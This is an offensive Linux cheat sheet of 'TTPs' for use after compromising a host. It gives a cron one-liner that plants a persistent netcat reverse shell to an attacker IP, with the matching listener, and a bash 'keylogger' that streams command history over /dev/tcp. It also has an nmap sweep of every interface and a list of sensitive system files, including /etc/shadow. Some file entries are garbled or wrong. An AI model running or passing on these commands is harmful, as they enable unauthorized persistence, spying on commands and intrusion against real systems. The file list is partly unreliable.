# Linux TTPs:

## One Liner to Add Persistence on a Box via Cron:

```
echo "* * * * * /bin/nc <attacker IP> 1234 -e /bin/bash" > cron && crontab cron
```

On the attack platform: ```nc -lvp 1234```

## Nmap Scan Every Interface that is Assigned an IP:

```
ifconfig -a | grep -Po '\b(?!255)(?:\d{1,3}\.){3}(?!255)\d{1,3}\b' | xargs nmap -A -p0-
```

## Bash Keylogger:

```PROMPT_COMMAND='history -a; tail -n1 ~/.bash_history > /dev/tcp/127.0.0.1/9000'```

## Important Files:

```
/boot/vmlinuz : The Linux Kernel file.
/dev/had : Device file for the first IDE HDD (Hard Disk Drive) /dev/hdc : Device file for the IDE Cdrom, commonly
/dev/null : A pseudo device
/etc/bashrc : System defaults and aliases used by bash shell. /etc/crontab : Cron run commands on a predefined time Interval. /etc/exports : Information of the file system available on network. /etc/fstab : Information of Disk Drive and their mount point. /etc/group : Information of Security Group.
/etc/grub.conf : grub bootloader configuration file.
/etc/init.d : Service startup Script.
/etc/lilo.conf : lilo bootloader configuration file.
/etc/hosts : Information on IP's and corresponding hostnames. /etc/hosts.allow : Hosts allowed access to services on local host. /etc/host.deny : Hosts denied access to services on local host. /etc/inittab : INIT process and interactions at various run level. /etc/issue : Allows to edit the pre-login message. /etc/modules.conf : Configuration files for system modules. /etc/motd : Message Of The Day
/etc/mtab : Currently mounted blocks information.
/etc/passwd : System users with password hash redacted. /etc/printcap : Printer Information
/etc/profile : Bash shell defaults
/etc/profile.d : Application script, executed after login. /etc/rc.d : Information about run level specific script. /etc/rc.d/init.d : Run Level Initialisation Script. /etc/resolv.conf : Domain Name Servers (DNS) being used by System. /etc/securetty : Terminal List, where root login is possible. /etc/shadow : System users with password hash.
/etc/skel : Script that populates new user home directory. /etc/termcap : ASCII file defines the behavior of Terminal. /etc/X11 : Configuration files of X-window System.
/usr/bin : Normal user executable commands.
/usr/bin/X11 : Binaries of X windows System.
/usr/include : Contains include files used by ‘c‘ program. /usr/share : Shared directories of man files, info files, etc. /usr/lib : Library files required during program compilation. /usr/sbin : Commands for Super User, for System Administration. /proc/cpuinfo : CPU Information
/proc/filesystems : File-system information being used currently. /proc/interrupts : Information about the current interrupts. /proc/ioports : All Input/Output addresses used by devices. /proc/meminfo : Memory Usages Information.
/proc/modules : Currently used kernel module.
/proc/mount : Mounted File-system Information.
/proc/stat : Detailed Statistics of the current System. /proc/swaps : Swap File Information.
/version : Linux Version Information.
/var/log/auth* : Log of authorization login attempts. /var/log/lastlog : Log of last boot process.
```
